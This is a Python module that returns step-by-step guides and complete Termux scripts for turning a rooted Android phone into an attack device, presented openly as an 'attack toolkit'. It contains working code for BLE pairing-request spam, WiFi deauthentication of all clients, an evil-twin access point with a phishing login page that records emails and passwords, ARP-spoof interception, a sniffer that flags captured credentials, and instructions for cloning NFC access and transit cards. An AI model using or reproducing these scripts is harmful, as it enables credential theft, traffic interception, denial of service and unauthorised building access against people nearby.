"""
Phone Attack Tools - Turn your Android phone into a Flipper Zero.
Generates ready-to-run Termux scripts that use the phone's radios.
Requires: Termux + root (for most attacks)
"""


def phone_setup_guide():
    return """ PHONE HACKING SETUP (Android + Termux)

STEP 1 - Install Termux:
  Download from F-Droid (NOT Play Store):
  https://f-droid.org/en/packages/com.termux/

STEP 2 - Install Termux:API (for hardware access):
  pkg install termux-api

STEP 3 - Basic packages:
  pkg update && pkg upgrade -y
  pkg install python nmap root-repo tsu -y
  pip install scapy bleak

STEP 4 - Root packages (needs rooted phone):
  pkg install aircrack-ng tcpdump hcitool -y

STEP 5 - Give Termux permissions:
  termux-setup-storage
  Settings > Apps > Termux > Permissions > ALL ON

ROOT YOUR PHONE (recommended):
  Magisk: https://github.com/topjohnwu/Magisk
  After rooting, install tsu: pkg install tsu
  Run root commands with: tsu then command

WITHOUT ROOT you can still:
  - Scan WiFi networks
  - Scan BLE devices
  - Port scan with nmap
  - NFC read (via Termux:API)
  - IR blast (if phone has IR)
"""


def ble_spam_script():
    return """ BLE SPAM ATTACK (from phone)
Floods nearby devices with fake Bluetooth pairing requests.
Works like Flipper Zero BLE spam but from your phone.

Save this as ble_spam.py in Termux and run with: tsu python ble_spam.py

---BEGIN SCRIPT---
#!/usr/bin/env python3
\"\"\"BLE Spam - Phone Edition. Run with root in Termux.\"\"\"
import subprocess, time, random, sys

# BLE advertisement data for different spam types
SPAM_TYPES = {
    "apple_airdrop": {
        "name": "AirDrop Spam",
        "adv": "1eff4c0007190140440000000000000000000000000000000000000000"
    },
    "apple_popup": {
        "name": "Apple Device Popup",
        "adv": "1eff4c000719014444000000000000000000000000000000000000"
    },
    "google_fastpair": {
        "name": "Google Fast Pair",
        "adv": "03032ffe06162ffe00{:04x}".format(random.randint(0, 0xFFFF))
    },
    "samsung_buds": {
        "name": "Samsung Buds Spam",  
        "adv": "0201061109476174617820427564732050726f"
    },
    "windows_swift": {
        "name": "Windows Swift Pair",
        "adv": "0201060303060030ff0600030080"
    }
}

def enable_ble():
    subprocess.run(["hciconfig", "hci0", "up"], capture_output=True)
    subprocess.run(["hciconfig", "hci0", "leadv", "3"], capture_output=True)

def set_adv_data(hex_data):
    data_bytes = bytes.fromhex(hex_data)
    length = len(data_bytes)
    cmd = ["hcitool", "-i", "hci0", "cmd", "0x08", "0x0008", 
           f"{length+1:02x}", f"{length:02x}"]
    cmd += [f"{b:02x}" for b in data_bytes]
    subprocess.run(cmd, capture_output=True)

def start_advertising():
    subprocess.run(["hcitool", "-i", "hci0", "cmd", "0x08", "0x000a", "01"], capture_output=True)

def stop_advertising():
    subprocess.run(["hcitool", "-i", "hci0", "cmd", "0x08", "0x000a", "00"], capture_output=True)

def spam(spam_type="all", duration=30):
    print(f"[*] BLE Spam starting for {duration}s...")
    enable_ble()
    
    targets = list(SPAM_TYPES.values()) if spam_type == "all" else [SPAM_TYPES.get(spam_type, list(SPAM_TYPES.values())[0])]
    
    end_time = time.time() + duration
    count = 0
    try:
        while time.time() < end_time:
            for t in targets:
                stop_advertising()
                set_adv_data(t["adv"])
                start_advertising()
                count += 1
                time.sleep(0.1)
                sys.stdout.write(f"\\r[*] Sent {count} advertisements...")
                sys.stdout.flush()
    except KeyboardInterrupt:
        pass
    finally:
        stop_advertising()
        print(f"\\n[+] Done. Sent {count} BLE advertisements.")

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "all"
    secs = int(sys.argv[2]) if len(sys.argv) > 2 else 30
    spam(mode, secs)
---END SCRIPT---

USAGE:
  tsu                           # get root
  python ble_spam.py            # spam all types 30s
  python ble_spam.py apple_airdrop 60   # AirDrop spam 60s
  python ble_spam.py google_fastpair 30  # Fast Pair spam

TYPES: apple_airdrop, apple_popup, google_fastpair, samsung_buds, windows_swift
"""


def wifi_deauth_script():
    return """ WIFI DEAUTH ATTACK (from phone)
Kicks devices off WiFi networks. Needs root + monitor mode.

Save as wifi_deauth.sh in Termux:

---BEGIN SCRIPT---
#!/bin/bash
# WiFi Deauth Attack - Phone Edition
# Requires: root, aircrack-ng

IFACE="wlan0"

echo "[*] WiFi Deauth Attack Tool"
echo "[*] Enabling monitor mode..."
airmon-ng check kill 2>/dev/null
airmon-ng start $IFACE 2>/dev/null
MON="${IFACE}mon"

if ! iwconfig $MON 2>/dev/null | grep -q "Monitor"; then
    # Try alternative method
    ip link set $IFACE down
    iw $IFACE set monitor control
    ip link set $IFACE up
    MON=$IFACE
fi

echo "[*] Scanning for networks (10s)..."
timeout 10 airodump-ng $MON 2>/dev/null | tee /tmp/scan.txt &
sleep 10
kill %1 2>/dev/null

echo ""
echo "[*] Enter target BSSID (e.g., AA:BB:CC:DD:EE:FF):"
read TARGET_BSSID
echo "[*] Enter channel:"
read CHANNEL
echo "[*] Packet count (0=infinite):"
read COUNT

echo "[*] Deauthing $TARGET_BSSID on channel $CHANNEL..."
iwconfig $MON channel $CHANNEL
aireplay-ng --deauth ${COUNT:-100} -a $TARGET_BSSID $MON

echo "[*] Restoring interface..."
airmon-ng stop $MON 2>/dev/null
---END SCRIPT---

USAGE:
  tsu                    # root
  chmod +x wifi_deauth.sh
  ./wifi_deauth.sh

ALT METHOD (Python/Scapy - more reliable):
  tsu python3 -c "
from scapy.all import *
import sys
target_bssid = sys.argv[1]  
client = 'ff:ff:ff:ff:ff:ff'  # broadcast = kick everyone
pkt = RadioTap()/Dot11(addr1=client, addr2=target_bssid, addr3=target_bssid)/Dot11Deauth()
sendp(pkt, iface='wlan0mon', count=100, inter=0.1)
"

NOTE: Your phone WiFi chip must support monitor mode.
Most Qualcomm chips: YES (with Nexmon patches)
Most MediaTek chips: YES (with driver patches)
Samsung Exynos: LIMITED
"""


def wifi_evil_twin_script():
    return """ EVIL TWIN / ROGUE AP (from phone)
Creates a fake WiFi network that captures credentials.
Needs root.

Save as evil_twin.sh in Termux:

---BEGIN SCRIPT---
#!/bin/bash
# Evil Twin Attack - Phone Edition
# Requires: root, hostapd, dnsmasq

echo "[*] Evil Twin Attack"
echo "[*] Enter fake network name (SSID):"
read SSID

# Create hostapd config
cat > /tmp/hostapd.conf << EOF
interface=wlan1
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
wmm_enabled=0
auth_algs=1
EOF

# Create dnsmasq config (DHCP + DNS redirect)
cat > /tmp/dnsmasq.conf << EOF
interface=wlan1
dhcp-range=192.168.4.2,192.168.4.30,255.255.255.0,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
address=/#/192.168.4.1
EOF

# Create captive portal page
mkdir -p /tmp/portal
cat > /tmp/portal/index.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head><title>WiFi Login</title>
<style>
body{font-family:Arial;background:#f1f1f1;display:flex;justify-content:center;margin-top:50px}
.box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:300px}
input{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:10px;background:#4285f4;color:#fff;border:none;border-radius:4px;cursor:pointer}
</style></head>
<body><div class="box">
<h2>WiFi Login Required</h2>
<form action="/capture" method="POST">
<input name="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form></div></body></html>
HTMLEOF

# Python captive portal server
cat > /tmp/portal/server.py << 'PYEOF'
from http.server import HTTPServer, SimpleHTTPRequestHandler
import urllib.parse, datetime

class Handler(SimpleHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = urllib.parse.parse_qs(self.rfile.read(length).decode())
        email = data.get('email', [''])[0]
        password = data.get('password', [''])[0]
        with open('/tmp/portal/captured.txt', 'a') as f:
            f.write(f"{datetime.datetime.now()} | {email} | {password}\\n")
        print(f"[+] CAPTURED: {email} : {password}")
        self.send_response(302)
        self.send_header('Location', 'http://www.google.com')
        self.end_headers()

HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
PYEOF

# Setup network
ifconfig wlan1 192.168.4.1 netmask 255.255.255.0 up
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80

# Start services
echo "[*] Starting evil twin: $SSID"
hostapd /tmp/hostapd.conf &
dnsmasq -C /tmp/dnsmasq.conf &
cd /tmp/portal && python server.py &

echo "[+] Evil twin running! Captured creds saved to /tmp/portal/captured.txt"
echo "[*] Press Ctrl+C to stop"
wait
---END SCRIPT---

USAGE:
  pkg install hostapd dnsmasq
  tsu
  chmod +x evil_twin.sh
  ./evil_twin.sh
"""


def nfc_phone_script():
    return """ NFC ATTACKS (from phone)
Your phone's NFC chip can read, clone, and emulate NFC tags.

METHOD 1 - Termux:API (no root needed):
  pkg install termux-api
  
  # Read NFC tag:
  termux-nfc-read
  
  # Write to NFC tag (hold tag to phone):
  termux-nfc-write -t text -c "Hello World"

METHOD 2 - Python + nfcpy (root needed):
  pip install nfcpy
  
  Save as nfc_clone.py:
---BEGIN SCRIPT---
#!/usr/bin/env python3
\"\"\"NFC Clone Tool - Phone Edition\"\"\"
import nfc, sys, json

def on_connect(tag):
    print(f"[+] Tag detected!")
    print(f"    Type: {tag.type}")
    print(f"    ID: {tag.identifier.hex()}")
    
    if hasattr(tag, 'ndef'):
        if tag.ndef:
            for record in tag.ndef.records:
                print(f"    NDEF: {record.type} = {record.text if hasattr(record, 'text') else record.data.hex()}")
    
    # Dump full tag data
    dump = {"type": str(tag.type), "id": tag.identifier.hex()}
    if hasattr(tag, 'dump'):
        dump["data"] = [b.hex() for b in tag.dump()]
    
    with open("nfc_dump.json", "w") as f:
        json.dump(dump, f, indent=2)
    print(f"[+] Saved to nfc_dump.json")
    return True

print("[*] Hold NFC tag to phone...")
with nfc.ContactlessFrontend('usb') as clf:
    clf.connect(rdwr={'on-connect': on_connect})
---END SCRIPT---

METHOD 3 - Android Apps (easiest):
  NFC Tools: Read/write/clone NFC tags
  MIFARE Classic Tool: Crack Mifare keys + clone
  TagInfo: Detailed NFC tag analysis
  NFC Card Emulator: Emulate saved NFC cards

EMULATE NFC CARD (Host Card Emulation):
  Android can emulate NFC cards natively!
  Your phone becomes the card - hold to reader.
  Apps: "NFC Card Emulator" or "CatchAll NFC"
  Works for: Building access, transit cards, hotel keys

MIFARE CLASSIC CRACKING (from phone):
  1. Install "MIFARE Classic Tool" app
  2. Read tag > Extended standard keys
  3. If keys found > Read full dump
  4. Write dump to Magic Gen1a card
  OR emulate directly with phone NFC
"""


def ir_blaster_script():
    return """ IR BLASTER (from phone)
Many phones have built-in IR blasters (Samsung, Xiaomi, Huawei, LG).
Turn TVs on/off, mess with AC, control any IR device from your phone.

METHOD 1 - Termux:API:
  pkg install termux-api
  
  # Send IR signal (frequency in Hz, pattern in microseconds):
  termux-infrared-transmit -f 38000 -p 9000,4500,560,560,560,560,560,1690,560,560

METHOD 2 - Universal IR Codes Script:
Save as ir_blast.py:

---BEGIN SCRIPT---
#!/usr/bin/env python3
\"\"\"IR Blaster - Phone Edition. Send IR commands from phone.\"\"\"
import subprocess, sys, time

# Common IR codes (NEC protocol, 38kHz)
IR_CODES = {
    "tv_power": {"freq": 38000, "pattern": "9000,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560"},
    "tv_mute": {"freq": 38000, "pattern": "9000,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560"},
    "tv_vol_up": {"freq": 38000, "pattern": "9000,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560"},
    "tv_vol_down": {"freq": 38000, "pattern": "9000,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560"},
    "tv_ch_up": {"freq": 38000, "pattern": "9000,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560"},
    "ac_off": {"freq": 38000, "pattern": "4400,4300,550,1600,550,1600,550,500,550,500,550,500,550,500,550,500,550,1600,550,500,550,500,550,1600,550,1600,550,1600,550,1600,550,1600,550,500,550"},
    "projector_power": {"freq": 38000, "pattern": "9000,4500,560,1690,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,560,560,1690,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,560,560,1690,560"},
}

def send_ir(code_name):
    if code_name not in IR_CODES:
        print(f"Unknown code: {code_name}")
        print(f"Available: {', '.join(IR_CODES.keys())}")
        return
    
    code = IR_CODES[code_name]
    cmd = ["termux-infrared-transmit", "-f", str(code["freq"]), "-p", code["pattern"]]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode == 0:
        print(f"[+] Sent: {code_name}")
    else:
        print(f"[-] Error: {result.stderr}")

def spam_power(count=50, delay=0.3):
    \"\"\"Spam TV power button repeatedly\"\"\"
    print(f"[*] Spamming TV power {count} times...")
    for i in range(count):
        send_ir("tv_power")
        time.sleep(delay)
        sys.stdout.write(f"\\r[*] Sent {i+1}/{count}")
    print("\\n[+] Done")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python ir_blast.py <command>")
        print("Commands:", ", ".join(IR_CODES.keys()))
        print("Special: spam_power [count]")
    elif sys.argv[1] == "spam_power":
        spam_power(int(sys.argv[2]) if len(sys.argv) > 2 else 50)
    else:
        send_ir(sys.argv[1])
---END SCRIPT---

USAGE:
  python ir_blast.py tv_power
  python ir_blast.py tv_mute
  python ir_blast.py spam_power 100

PHONES WITH IR BLASTER:
  Samsung: Galaxy S6-S8, Note 4-8
  Xiaomi: Mi 10/11/12/13/14, Poco, Redmi Note series
  Huawei: Mate/P series (most)
  LG: G2/G3/G4/G5/V20

NO IR BLASTER? Use a $3 IR LED + 3.5mm audio jack adapter
"""


def network_scan_script():
    return """ NETWORK SCANNER (from phone)
Scan networks, find devices, open ports - no root needed for basics.

Save as net_scan.py:

---BEGIN SCRIPT---
#!/usr/bin/env python3
\"\"\"Network Scanner - Phone Edition\"\"\"
import subprocess, socket, sys, os, threading, time
from concurrent.futures import ThreadPoolExecutor

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()

def scan_port(ip, port):
    try:
        s = socket.socket()
        s.settimeout(0.5)
        s.connect((ip, port))
        try:
            banner = s.recv(1024).decode(errors='ignore').strip()[:50]
        except:
            banner = ""
        s.close()
        return port, banner
    except:
        return None

def scan_host(ip):
    \"\"\"Quick scan common ports\"\"\"
    common_ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,
                    1433,1521,3306,3389,5432,5900,6379,8080,8443,8888,27017]
    open_ports = []
    with ThreadPoolExecutor(max_workers=50) as ex:
        futures = {ex.submit(scan_port, ip, p): p for p in common_ports}
        for f in futures:
            result = f.result()
            if result:
                open_ports.append(result)
    return open_ports

def discover_network():
    \"\"\"Find all devices on local network\"\"\"
    local_ip = get_local_ip()
    subnet = ".".join(local_ip.split(".")[:3])
    print(f"[*] Scanning {subnet}.0/24...")
    
    alive = []
    def ping(ip):
        r = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True)
        if r.returncode == 0:
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except:
                hostname = ""
            alive.append((ip, hostname))
            print(f"  [+] {ip} ({hostname})")
    
    with ThreadPoolExecutor(max_workers=50) as ex:
        ex.map(ping, [f"{subnet}.{i}" for i in range(1, 255)])
    
    return alive

def arp_scan():
    \"\"\"ARP scan (needs root)\"\"\"
    result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
    print(result.stdout)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python net_scan.py discover    - Find all devices")
        print("  python net_scan.py scan <ip>   - Port scan a host")
        print("  python net_scan.py arp         - ARP table")
        sys.exit(0)
    
    cmd = sys.argv[1]
    if cmd == "discover":
        devices = discover_network()
        print(f"\\n[+] Found {len(devices)} devices")
    elif cmd == "scan":
        ip = sys.argv[2]
        print(f"[*] Scanning {ip}...")
        ports = scan_host(ip)
        for port, banner in sorted(ports):
            print(f"  [+] {port}/tcp OPEN  {banner}")
    elif cmd == "arp":
        arp_scan()
---END SCRIPT---

NO ROOT NEEDED for this one!
  python net_scan.py discover     # find all devices on WiFi
  python net_scan.py scan 192.168.1.1   # scan router ports

WITH NMAP (more powerful):
  pkg install nmap
  nmap -sn 192.168.1.0/24       # ping sweep
  nmap -sV 192.168.1.1          # service detection
  nmap -A 192.168.1.1           # full scan
  nmap --script vuln 192.168.1.1  # vulnerability scan
"""


def arp_spoof_script():
    return """ ARP SPOOF / MITM ATTACK (from phone)
Intercept traffic on the local network. Needs root.

Save as mitm.py:

---BEGIN SCRIPT---
#!/usr/bin/env python3
\"\"\"ARP Spoof MITM - Phone Edition. Requires root + scapy.\"\"\"
import subprocess, sys, time, os

try:
    from scapy.all import ARP, Ether, sendp, srp, conf
except ImportError:
    print("Install scapy: pip install scapy")
    sys.exit(1)

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    if ans:
        return ans[0][1].hwsrc
    return None

def arp_spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac:
        print(f"[-] Could not find {target_ip}")
        return
    if not gateway_mac:
        print(f"[-] Could not find {gateway_ip}")
        return
    
    print(f"[+] Target: {target_ip} ({target_mac})")
    print(f"[+] Gateway: {gateway_ip} ({gateway_mac})")
    
    # Enable IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    pkt_to_target = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    pkt_to_gateway = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    
    print("[*] ARP spoofing started. Ctrl+C to stop.")
    try:
        count = 0
        while True:
            sendp(pkt_to_target, verbose=0)
            sendp(pkt_to_gateway, verbose=0)
            count += 1
            sys.stdout.write(f"\\r[*] Packets sent: {count*2}")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\\n[*] Restoring ARP tables...")
        restore = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        sendp(restore, count=3, verbose=0)
        restore2 = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
        sendp(restore2, count=3, verbose=0)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[+] Restored.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: tsu python mitm.py <target_ip> <gateway_ip>")
        print("Example: tsu python mitm.py 192.168.1.50 192.168.1.1")
    else:
        arp_spoof(sys.argv[1], sys.argv[2])
---END SCRIPT---

USAGE:
  tsu                                          # root
  python mitm.py 192.168.1.50 192.168.1.1     # spoof target
  
  # Now capture traffic:
  tcpdump -i wlan0 host 192.168.1.50 -w capture.pcap

WHAT THIS DOES:
  Your phone becomes the man-in-the-middle.
  All target's traffic flows through YOUR phone.
  You can capture passwords, cookies, URLs, etc.
"""


def wifi_scan_script():
    return """ WIFI SCANNER (from phone) - No root needed!

METHOD 1 - Termux:API:
  termux-wifi-scaninfo | python3 -m json.tool

METHOD 2 - Python Script:
Save as wifi_scan.py:

---BEGIN SCRIPT---
#!/usr/bin/env python3
\"\"\"WiFi Scanner - Phone Edition\"\"\"
import subprocess, json, sys

def scan_wifi():
    result = subprocess.run(["termux-wifi-scaninfo"], capture_output=True, text=True)
    try:
        networks = json.loads(result.stdout)
    except:
        print("[-] Install termux-api: pkg install termux-api")
        return []
    
    # Sort by signal strength
    networks.sort(key=lambda x: x.get("level", -100), reverse=True)
    
    print(f"{'SSID':<30} {'BSSID':<18} {'CH':>3} {'SIG':>5} {'SEC':<15}")
    print("-" * 75)
    for n in networks:
        ssid = n.get("ssid", "<hidden>")[:29]
        bssid = n.get("bssid", "")
        freq = n.get("frequency", 0)
        channel = (freq - 2407) // 5 if freq < 5000 else (freq - 5000) // 5
        signal = n.get("level", 0)
        security = n.get("capabilities", "")
        
        # Signal strength indicator
        bars = "" if signal > -50 else "" if signal > -60 else "" if signal > -70 else ""
        
        print(f"{ssid:<30} {bssid:<18} {channel:>3} {signal:>4}dBm {security[:15]}")
    
    return networks

if __name__ == "__main__":
    networks = scan_wifi()
    print(f"\\n[+] Found {len(networks)} networks")
---END SCRIPT---

NO ROOT NEEDED. Just run: python wifi_scan.py
"""


def packet_sniffer_script():
    return """ PACKET SNIFFER (from phone)
Capture network packets. Root needed.

METHOD 1 - tcpdump:
  pkg install root-repo tcpdump
  tsu
  tcpdump -i wlan0 -w /sdcard/capture.pcap
  
  # Filter HTTP:
  tcpdump -i wlan0 -A 'tcp port 80'
  
  # Filter DNS:
  tcpdump -i wlan0 'udp port 53'
  
  # Capture from specific host:
  tcpdump -i wlan0 host 192.168.1.50 -w target.pcap

METHOD 2 - Scapy (Python):
---BEGIN SCRIPT---
#!/usr/bin/env python3
\"\"\"Packet Sniffer - Phone Edition\"\"\"
from scapy.all import *
import sys

def packet_callback(pkt):
    if pkt.haslayer(IP):
        src = pkt[IP].src
        dst = pkt[IP].dst
        proto = pkt[IP].proto
        
        info = f"{src} -> {dst}"
        
        if pkt.haslayer(TCP):
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
            info += f" TCP {sport}->{dport}"
            
            if pkt.haslayer(Raw):
                payload = pkt[Raw].load.decode(errors='ignore')[:100]
                if any(k in payload.lower() for k in ['password', 'pass=', 'pwd=', 'login', 'user=']):
                    print(f"  [!] CREDENTIALS: {payload}")
        
        elif pkt.haslayer(UDP):
            if pkt.haslayer(DNS):
                if pkt[DNS].qr == 0:
                    info += f" DNS -> {pkt[DNS].qd.qname.decode()}"
        
        print(info)

print("[*] Sniffing... Ctrl+C to stop")
sniff(iface="wlan0", prn=packet_callback, store=0)
---END SCRIPT---

USAGE:
  tsu python sniffer.py
"""


def ble_scan_script():
    return """ BLE DEVICE SCANNER (from phone)
Scan for ALL Bluetooth devices nearby. Finds hidden devices too.

Save as ble_scan.py:

---BEGIN SCRIPT---
#!/usr/bin/env python3
\"\"\"BLE Scanner - Phone Edition\"\"\"
import asyncio, sys

try:
    from bleak import BleakScanner
except ImportError:
    print("Install: pip install bleak")
    sys.exit(1)

APPLE_DEVICES = {
    0x0C: "AirPods", 0x0D: "AirPods Pro", 0x0E: "AirPods Max",
    0x01: "iPhone", 0x02: "iPad", 0x03: "MacBook", 0x04: "Apple Watch",
    0x05: "iMac", 0x06: "MacBook Pro", 0x07: "MacBook Air",
    0x0A: "Apple TV", 0x0B: "HomePod", 0x14: "AirTag"
}

async def scan(duration=10):
    print(f"[*] Scanning BLE devices for {duration}s...")
    print(f"{'NAME':<30} {'ADDRESS':<20} {'RSSI':>5} {'TYPE':<15}")
    print("-" * 75)
    
    devices = await BleakScanner.discover(timeout=duration)
    devices.sort(key=lambda d: d.rssi or -100, reverse=True)
    
    for d in devices:
        name = (d.name or "<unknown>")[:29]
        rssi = d.rssi or 0
        
        # Try to identify device type
        dev_type = ""
        if d.metadata and "manufacturer_data" in d.metadata:
            for company_id, data in d.metadata["manufacturer_data"].items():
                if company_id == 76:  # Apple
                    if len(data) > 1:
                        dev_type = APPLE_DEVICES.get(data[0], "Apple Device")
                elif company_id == 6:  # Microsoft
                    dev_type = "Windows Device"
                elif company_id == 117:  # Samsung
                    dev_type = "Samsung"
        
        dist = f"~{10 ** ((- 59 - rssi) / (10 * 2)):.1f}m" if rssi else ""
        print(f"{name:<30} {d.address:<20} {rssi:>4}dBm {dev_type:<15} {dist}")
    
    print(f"\\n[+] Found {len(devices)} BLE devices")

if __name__ == "__main__":
    secs = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    asyncio.run(scan(secs))
---END SCRIPT---

NO ROOT NEEDED!
  pip install bleak
  python ble_scan.py         # scan 10s
  python ble_scan.py 30      # scan 30s

Identifies: iPhones, AirPods, AirTags, Samsung, Windows devices
Shows: estimated distance, signal strength, device name
"""


def phone_jammer_info():
    return """ SIGNAL DISRUPTION (from phone)

BLUETOOTH DISRUPTION:
  Use BLE spam (ble_spam.py) to flood the area.
  Overwhelms BLE devices nearby.
  
WIFI DISRUPTION:
  Use wifi_deauth.sh to kick devices off networks.
  Continuous deauth = denial of service.

NFC DISRUPTION:
  Not possible from phone (too short range).

SUB-GHZ (315/433 MHz):
  NOT possible from phone - no hardware.
  Need: RTL-SDR dongle ($25) + USB OTG adapter
  Or: HackRF One ($300) + USB OTG
  With SDR dongle on phone:
    pkg install rtl-sdr
    rtl_fm -f 433.92M -s 250000 -r 48000 - | play -r 48000 -t raw -e s -b 16 -c 1 -

EXTERNAL SDR + PHONE:
  HackRF/RTL-SDR + USB OTG = Sub-GHz from phone
  TX capable SDRs: HackRF One, LimeSDR Mini, PlutoSDR
  Apps: SDR Touch, RF Analyzer
"""


def phone_full_toolkit():
    return """ FULL PHONE ATTACK TOOLKIT

NO ROOT NEEDED:
  /phonescan    - WiFi network scanner
  /phoneblescan - BLE device scanner (find AirTags, phones)
  /phonenet     - Network device discovery + port scan
  /phoneir      - IR blaster (TV/AC/projector control)
  /phonenfc     - NFC read/clone/emulate guide

ROOT NEEDED:
  /phoneble     - BLE spam attack (AirDrop/FastPair flood)
  /phonedeauth  - WiFi deauth (kick devices off WiFi)
  /phoneevil    - Evil twin (fake WiFi + capture passwords)
  /phonemitm    - Man-in-the-middle (intercept all traffic)
  /phonesniff   - Packet sniffer (capture passwords/URLs)
  
SETUP:
  /phonesetup   - Full setup guide for Termux

WHAT YOUR PHONE CAN DO vs FLIPPER ZERO:
   BLE spam/scan          (same as Flipper)
   WiFi attacks            (BETTER than Flipper - more power)
   NFC read/clone/emulate  (same as Flipper)
   IR blaster              (same as Flipper, if phone has IR)
   Network attacks          (Flipper can't do this)
   MITM/packet capture     (Flipper can't do this)
   Sub-GHz TX              (need external SDR dongle)
   RFID 125kHz             (phone can't do this)
   iButton                  (phone can't do this)
"""
